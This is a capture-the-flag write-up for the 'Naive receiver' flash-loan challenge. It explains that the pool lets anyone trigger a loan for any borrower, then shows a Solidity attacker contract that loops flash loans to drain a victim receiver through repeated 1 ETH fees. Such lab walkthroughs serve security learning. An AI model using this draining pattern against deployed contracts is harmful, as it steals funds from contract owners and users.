# Challenge 2 — Naive receiver

## Description

In the lending pool `NaiveReceiverLenderPool`,  offering expensive (1 ETH) flash loans of Ether, the function `flashLoan` provides the loan.
Funds are loaned from the `NaiveReceiverLenderPool` contract to the FlashLoanReceiver contract which must repay the loaned amount plus a large fee (1 ETH) .
In the `flashLoan` function, the process is:

1. Check that the `borrowAmount` to be sure that it is less that the actual balance of the contract:
	```solidity
	uint256 balanceBefore =  address(this).balance;
	require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
	```

2. Check that `borrower` is a contract:
	```solidity
	require(address(borrower).isContract(), "Borrower must be a deployed contract");
	```

3. Transfer ETH and handle control to receiver:
	```solidity
	(bool success, ) = borrower.call{value: borrowAmount}(
		abi.encodeWithSignature(
			"receiveEther(uint256)",
			FIXED_FEE
		)
	);
	```

## Vulnerability

In the `flashLoan` function, the loanee’s address `borrower` is passed as a parameter.
However, the transaction can be initiated by anyone since there is no restriction on that in the function body.

## How to exploit?

1. Create an attacker contract that calls the pool’s `flashLoan` function passing `FlashLoanReceiver`‘s address as the `borrower.`

2. Do it ten times (until balance of the naive received is less than `FIXED_FEE = 1 ETH`) and the `borrower` will run out of funds.

	```solidity
	function  attack(
	INaiveReceiverLenderPool  pool,
	address  payable  receiver
	) public {
		uint256  FIXED_FEE  = pool.fixedFee();
		while (receiver.balance >=  FIXED_FEE) {
			pool.flashLoan(receiver, 0);
		}
	}
	```
	The call should be:
	```javascript
	await  this.attacker.attack(this.pool.address, this.receiver.address);
	```
